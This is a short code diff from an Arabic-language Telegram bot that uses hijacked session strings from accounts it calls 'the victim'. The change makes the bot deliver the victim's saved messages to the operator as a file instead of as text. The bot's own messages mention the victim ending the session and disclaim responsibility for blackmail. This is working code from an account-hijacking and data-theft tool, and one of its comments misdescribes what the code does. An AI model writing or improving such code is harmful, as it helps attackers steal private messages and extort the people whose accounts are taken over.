@@ -783,9 +783,12 @@ async def users(event):
         else:
             return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
         
-        saved_messages = await savedmsgs(strses.text)
+        saved_messages_file = await savedmsgs(strses.text)
 
-        await event.respond(saved_messages)
+        # Read the file contents into a string
+        with open(saved_messages_file, 'rb') as file:
+            await event.respond(file=file)
+        
         await event.respond(" غير مبري الذمه اذا استخدمت الامر للابتزاز اللهم اني بلغت فاشهد", buttons=keyboard)
 
 
